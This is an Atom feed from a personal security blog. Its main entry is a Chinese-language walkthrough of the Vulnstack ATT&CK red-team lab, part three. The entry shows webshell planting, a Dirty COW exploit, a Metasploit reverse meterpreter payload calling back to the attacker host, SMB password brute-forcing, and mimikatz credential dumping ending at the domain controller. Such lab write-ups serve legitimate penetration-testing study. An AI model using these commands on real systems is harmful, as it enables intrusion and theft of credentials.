<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hdys0vn&#39;s Blog</title>
  
  <subtitle>向着光亮那方</subtitle>
  <link href="https://hdys0vn.github.io/atom.xml" rel="self"/>
  
  <link href="https://hdys0vn.github.io/"/>
  <updated>2022-03-23T13:32:58.749Z</updated>
  <id>https://hdys0vn.github.io/</id>
  
  <author>
    <name>Hdys0vn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列六</title>
    <link href="https://hdys0vn.github.io/2022/03/23/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E5%85%AD/"/>
    <id>https://hdys0vn.github.io/2022/03/23/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E5%85%AD/</id>
    <published>2022-03-23T13:32:58.000Z</published>
    <updated>2022-03-23T13:32:58.749Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列五</title>
    <link href="https://hdys0vn.github.io/2022/03/23/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%94/"/>
    <id>https://hdys0vn.github.io/2022/03/23/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%94/</id>
    <published>2022-03-23T13:32:50.000Z</published>
    <updated>2022-03-23T13:32:50.777Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列四</title>
    <link href="https://hdys0vn.github.io/2022/03/23/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E5%9B%9B/"/>
    <id>https://hdys0vn.github.io/2022/03/23/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E5%9B%9B/</id>
    <published>2022-03-23T13:32:43.000Z</published>
    <updated>2022-03-23T13:32:43.708Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列三</title>
    <link href="https://hdys0vn.github.io/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/"/>
    <id>https://hdys0vn.github.io/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/</id>
    <published>2021-10-30T14:26:03.000Z</published>
    <updated>2022-03-28T07:16:23.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ATT-amp-CK红队评估实战靶场（三）"><a href="#ATT-amp-CK红队评估实战靶场（三）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（三）"></a>ATT&amp;CK红队评估实战靶场（三）</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>继续内网基础学习，本篇文章为红日靶场系列的第三个靶场。本次靶场渗透涉及<strong>敏感信息泄露</strong>、<strong>暴力破解</strong>、<strong>脏牛提权</strong>、<strong>内网穿透</strong>、<strong>端口转发</strong>、以及<strong>域渗透</strong>等多种知识点。本次环境为黑盒测试，不提供虚拟机账号密码。</p><h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">内网网段：192.168.93.0&#x2F;24外网网段：192.168.1.0&#x2F;24攻击机：kali：192.168.1.5靶场：CentOS(内)：192.168.93.100CentOS(外)：192.168.1.110Ubuntu：192.168.93.120域内主机：Winserver2012：192.168.93.10Winserver2008：192.168.93.20Windows7：192.168.93.30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中CentOS可以外网、内网通信，域内主机只能内网之间进行通信<br>kali跟CentOS能够ping通</p><p>拓扑图如下：</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704161306005.png"></p><h3 id="0x03-漏洞发现及利用"><a href="#0x03-漏洞发现及利用" class="headerlink" title="0x03 漏洞发现及利用"></a>0x03 漏洞发现及利用</h3><h4 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h4><p>首先使用nmap扫描一下目标开放了哪些端口，可以看到开了22、80、3306端口，初步判断开了web，ssh，数据库应该为MySQL</p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 -sC -sV 192.168.1.110<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326190029601.png"></p><p>这里首先访问下80端口，看一下网站使用的什么框架，是否爆出过相关漏洞</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326190346600.png"></p><p>使用相关工具进行指纹识别</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326191939396.png"></p><p>使用msf的auxiliary&#x2F;scanner&#x2F;http&#x2F;joomla_version模块扫一下看看版本。Joomla版本探测显示版本为3.9.12</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326192042531.png"></p><p>这里使用dirsearch进一步进行扫描，发现了一个<code>configuration.php</code></p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326192740105.png"></p><p>看一下这个php的内容发现有一个user跟password，联想到开了3306这个端口，猜测这可能是管理员备份的数据库密码忘记删除了</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326192955180.png"></p><p> 这里使用navicat尝试连接一下靶机的数据库</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326193336514.png"></p><p>然后就是翻数据找管理员的帐号了，找管理员帐号肯定是找带有user字段跟password字段的，这里我找了一段时间，最后发现<code>umnbt_users</code>这个表跟管理员帐号最相似，但是这里出现了一个问题，我发现<code>password</code>这个地方的密码不是明文</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326193523355.png"></p><p>可以看到这里对密码进行了加密，不太清除到底是什么样的加密方式，直接进行MD5解密失败</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326194455007.png"></p><p>在搜索的时候发现joomla官网虽然没有直接公布密码的加密方式，但是它为了防止用户忘记密码增加了一个添加超级管理员用户的方式，就是通过登录数据库执行sql语句达到新建超级管理员的效果</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326194329858.png"></p><p>这里我们可以发现sql语句中的<code>VALUES</code>中的第三项为密文，这里我们为了方便就是用他给我们的这一串密文，这里对应的密码为<code>secret</code>，当然也可以用其他对应的密文如下所示</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326201158119.png"></p><p>在navicat中执行sql语句，注意这里要分开执行两个<code>INSERT INTO</code>否则回报错，这里相当于我们添加了一个<code>admin2 secret</code>这个新的超级管理员用户</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326201219286.png"></p><p>登录joomla后台 使用<code>admin2 secret</code>登录joomla，后台登录成功，进入后台后的操作一般都是找可以上传文件的地方上传图片马或者找一个能够写入sql语句的地方</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326202152375.png"></p><p>这里经过谷歌后发现，joomla的后台有一个模板的编辑处可以写入文件，这里找到<code>Extensions-&gt;Template-&gt;Templates</code></p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220326202246490.png"></p><p>这里选择<code>Beez3</code>这个模板进入编辑 ，写入一句话木马</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220327120455617.png"></p><h4 id="3-2-绕过函数限制"><a href="#3-2-绕过函数限制" class="headerlink" title="3.2 绕过函数限制"></a>3.2 绕过函数限制</h4><p>使用蚁剑连接成功</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220327120705063.png"></p><p>尝试执行命令，但是这里命令执行返回的是127，应该是<code>disable_functions</code>禁用了命令执行的函数，在windows下绕过<code>disable_functions</code>的方法虽然很少，但是在linux里面绕过<code>disable_functions</code>的方法却有很多，这里就不展开说了</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220327120841568.png"></p><p>这里为了方便我直接使用的是蚁剑里自带的插件绕过<code>disable_functions</code>，可以看到已经上传脚本操作成功了</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220327123250727.png"></p><p>这里我直接去连接上传的这个<code>.antproxy.php</code>，这里理论上是应该用原来的密码连接过去就可以执行命令了，但是这和地方不知道为什么返回数据为空</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328100929393.png"></p><p>这里还是想着如何能够绕过命令执行限制，这里尝试使用yangyangwithgnu师傅的绕过方式，然后通过传参的方式执行系统命令</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328111759798.png"></p><p>可以成功执行命令了</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328111825330.png"></p><p><code>ifconfig</code>看一下网卡情况，这里很奇怪，因为之前我们在扫描的时候这台CentOS的ip应该是192.168.1.0&#x2F;24这个网段的，但是这里ifconfig出来却是192.168.93.0&#x2F;24这个网段，当时说实话有点懵</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328111939214.png"></p><p><code>arp -a</code>查看下路由表，可以看到都是192.168.93.0&#x2F;24这个网段</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328112052754.png"></p><p>再看一下端口的进出，发现都是93这个网段</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328112201801.png"></p><p>interfaces中配置的静态网卡也是93这个网段</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328112321372.png"></p><h4 id="3-3-Nginx反向代理"><a href="#3-3-Nginx反向代理" class="headerlink" title="3.3 Nginx反向代理"></a>3.3 Nginx反向代理</h4><p>那么到这里已经很明显了，也就是说我们之前拿到的那台linux的192.168.1.0&#x2F;24这个网段相当于一个公网IP，但是真正的主机应该是192.168.93.0&#x2F;24，但这个是一个内网网段，所以说最符合这种情况的就是nginx反向代理</p><p>因为之前nginx反代的情况基本没遇到过，所以这里顺带补充一下自己的盲区</p><p><strong>何为代理</strong></p><p>在Java设计模式中，代理模式是这样定义的：给某个对象提供一个代理对象，并由代理对象控制原对象的引用。</p><p>可能大家不太明白这句话，在举一个现实生活中的例子：比如我们要买一间二手房，虽然我们可以自己去找房源，但是这太花费时间精力了，而且房屋质量检测以及房屋过户等一系列手续也都得我们去办，再说现在这个社会，等我们找到房源，说不定房子都已经涨价了，那么怎么办呢？最简单快捷的方法就是找二手房中介公司（为什么？别人那里房源多啊），于是我们就委托中介公司来给我找合适的房子，以及后续的质量检测过户等操作，我们只需要选好自己想要的房子，然后交钱就行了。</p><p>代理简单来说，就是如果我们想做什么，但又不想直接去做，那么这时候就找另外一个人帮我们去做。那么这个例子里面的中介公司就是给我们做代理服务的，我们委托中介公司帮我们找房子。</p><p><strong>何为反向代理</strong></p><p>反向代理和正向代理的区别就是：<strong>正向代理代理客户端，反向代理代理服务器。</strong></p><p>反向代理，其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。</p><p><strong>反向代理的好处</strong></p><p>那么为什么要用到反向代理呢，原因有以下几点：</p><pre class="line-numbers language-none"><code class="language-none">1、保护了真实的web服务器，web服务器对外不可见，外网只能看到反向代理服务器，而反向代理服务器上并没有真实数据，因此，保证了web服务器的资源安全2、反向代理为基础产生了动静资源分离以及负载均衡的方式，减轻web服务器的负担，加速了对网站访问速度（动静资源分离和负载均衡会以后说）3、节约了有限的IP地址资源，企业内所有的网站共享一个在internet中注册的IP地址，这些服务器分配私有地址，采用虚拟主机的方式对外提供服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>了解了反向代理之后，我们再具体的去探究一下Nginx反向代理的实现</p><p>1、模拟n个http服务器作为目标主机用作测试，简单的使用2个tomcat实例模拟两台http服务器，分别将tomcat的端口改为8081和8082</p><p>2、配置IP域名</p><pre class="line-numbers language-none"><code class="language-none">192.168.72.49 8081.max.com192.168.72.49 8082.max.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3、配置nginx.conf</p><pre class="line-numbers language-none"><code class="language-none">upstream tomcatserver1 &#123;    server 192.168.72.49:8081;    &#125;upstream tomcatserver2 &#123;    server 192.168.72.49:8082;    &#125;server &#123;        listen       80;        server_name  8081.max.com;        #charset koi8-r;        #access_log  logs&#x2F;host.access.log  main;        location &#x2F; &#123;            proxy_pass   http:&#x2F;&#x2F;tomcatserver1;            index  index.html index.htm;        &#125;         &#125;server &#123;        listen       80;        server_name  8082.max.com;        #charset koi8-r;        #access_log  logs&#x2F;host.access.log  main;        location &#x2F; &#123;            proxy_pass   http:&#x2F;&#x2F;tomcatserver2;            index  index.html index.htm;        &#125;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>流程：<br>1）浏览器访问8081.max.com，通过本地host文件域名解析，找到192.168.72.49服务器（安装nginx）<br>2）nginx反向代理接受客户机请求，找到server_name为8081.max.com的server节点，根据proxy_pass对应的http路径，将请求转发到upstream tomcatserver1上，即端口号为8081的tomcat服务器。</p><p>那么这里很明显还有一台linux主机在整个拓扑内做为内网Ubuntu的反向代理主机，这时候我翻缓存文件夹的时候发现了一个mysql文件夹，跟进去看看</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328103623351.png"></p><p>猜测是ssh账号密码，尝试登录，成功了。</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328103950930.png"></p><p>看一下主机和ip情况，可以发现这台主机已经不是我们之前的那台Ubuntu了，而是CentOS，而且双网卡，一张网卡是我们之前扫描时候得出的1.0&#x2F;24这个网段的ip，还有一个ip就是93.0&#x2F;24这个内网网段的ip，那么这台linux主机就是Ubuntu的反向代理主机无疑了</p><h4 id="3-4-脏牛提权"><a href="#3-4-脏牛提权" class="headerlink" title="3.4 脏牛提权"></a>3.4 脏牛提权</h4><p>这里直接选择linux提权首选的脏牛进行提权</p><pre class="line-numbers language-none"><code class="language-none">gcc -pthread dirty.c -o dirty -lcrypt&#x2F;&#x2F;编译dirty.c.&#x2F;dirty 123456&#x2F;&#x2F;创建一个高权限用户，密码为123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到这里已经执行成功，脏牛执行成功过后会自动生成一个名为<code>firefart</code>的高权限用户，密码就是我们刚才设置的123456</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328115145034.png"></p><h3 id="0x04-内网渗透"><a href="#0x04-内网渗透" class="headerlink" title="0x04 内网渗透"></a>0x04 内网渗透</h3><h4 id="4-1-centos上线msf"><a href="#4-1-centos上线msf" class="headerlink" title="4.1 centos上线msf"></a>4.1 centos上线msf</h4><p>这里因为是linux的原因，就不使用cs上线的打法了，先生成一个linux的payload上线到msf</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset lhost 192.168.1.5set lport 4444set target 7run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行之后会给出一个payload</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target 7    set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.5set lport 4444exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将payload复制到centos执行</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328115631322.png"></p><p>可以看到反弹session已经成功</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328115612085.png"></p><p>4.2 socks代理进入内网扫描</p><p>这里使用添加路由、使用<code>socks_proxy</code>模块进入内网</p><pre class="line-numbers language-none"><code class="language-none">#查看路由信息run get_local_subnets#添加一条路由run autoroute -s 192.168.93.0&#x2F;24use auxiliary&#x2F;server&#x2F;socks_proxyset version 4arun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在<code>/etc/proxychain.conf</code>文件中添加代理的ip和端口，这里一定要和设置里的对应</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328120345279.png"></p><p>这里可以使用<code>proxychain + nmap</code>进行扫描，这里为了方便我就直接使用msf中的模块对192.168.93.0&#x2F;24这个网段进行扫描了。注意这里在实战的时候可以适当把线程调小一点，不然流量会很大，这里因为是靶场的原因我就直接调成了20</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probeset rhosts 192.168.93.1-255set threads 20run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里扫描完之后可以发现，内网里有3台主机存活，分别是192.168.93.10 192.168.93.20 192.168.93.30 </p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328134835889.png"></p><p>但是这时候信息还不够，调用nmap继续扫描详细信息</p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 -sC -sV 192.168.93.10192.168.93.10 192.168.93.20 192.168.93.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先是10这台主机，可以看到开放了88跟389这两个端口，熟悉的师傅都应该知道这两个端口大概率锁定了这台主机就是域控</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328135435705.png"></p><p>20这台主机开的都是几个常规端口，值得注意的就是1433端口，意味着20这台主机上有mssql服务</p><p>30这台主机也是开了几个常规端口，跟前面两台主机相比就没什么特征端口，应该是一个普通的域成员主机</p><h4 id="4-2-永恒之蓝漏洞利用"><a href="#4-2-永恒之蓝漏洞利用" class="headerlink" title="4.2 永恒之蓝漏洞利用"></a>4.2 永恒之蓝漏洞利用</h4><p>这里我发现三台主机都开了139、445端口，那么先使用永恒之蓝模块先批量扫描一波看有没有可以直接用永恒之蓝打下来的主机</p><p>这里没有能够直接用永恒之蓝拿下的主机，win7跟2008匿名管道都没有开所以利用不了</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210708160657115.png"></p><h4 id="4-3-密码枚举"><a href="#4-3-密码枚举" class="headerlink" title="4.3 密码枚举"></a>4.3 密码枚举</h4><p>因为这三台主机都开了445端口，可以使用smb，使用msf中的<code>smb_login</code>模块进行密码枚举尝试</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginset rhosts 192.168.93.20set SMBUser Administratorset PASS_FILE &#x2F;tmp&#x2F;1W.txtrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里很幸运，跑出来的密码是<code>123qwe!ASD</code>刚好在我的<code>1W.txt</code>这个字典里面</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704151612269.png"></p><h4 id="4-4-psexec横向移动"><a href="#4-4-psexec横向移动" class="headerlink" title="4.4 psexec横向移动"></a>4.4 psexec横向移动</h4><p>这里使用proxifier将msf的socks代理到本地，忘记截图了orz…</p><p>这里既然已经拿到了administrator的密码，使用ipc先连接到20这一台主机，使用copy命令将mimikatz拷贝到20这台主机上</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704155242601.png"></p><p>然后使用psexec获取一个cmd环境，使用mimikatz抓取hash并保存为日志</p><pre class="line-numbers language-none"><code class="language-none">psexec64.exe \\192.168.93.20 cmdmimiKatz.exe log privilege::debug sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704155916269.png"></p><p>type mimikatz.log<code>读取日志内容可以发现域管的帐号密码为</code>Administrator zxcASDqw123!!</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210708161335659.png"></p><p>那么这里也直接使用ipc连接直接连接10这台主机，即TEST这个域的域控，可以看到已经连接成功了</p><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704160617532.png"></p><p>使用命令查看机密文件</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.93.10\C$\users\Administrator\Documentstype \\192.168.93.10\C$\users\Administrator\Documents\flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704160724866.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ATT-amp-CK红队评估实战靶场（三）&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场（三）&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场（三）&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场（三）&lt;/</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hdys0vn.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列二</title>
    <link href="https://hdys0vn.github.io/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/"/>
    <id>https://hdys0vn.github.io/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/</id>
